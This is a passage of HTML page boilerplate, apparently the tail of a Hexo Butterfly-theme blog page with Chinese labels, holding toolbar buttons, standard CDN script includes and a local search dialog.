id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><div class="js-pjax"></div><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="false"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
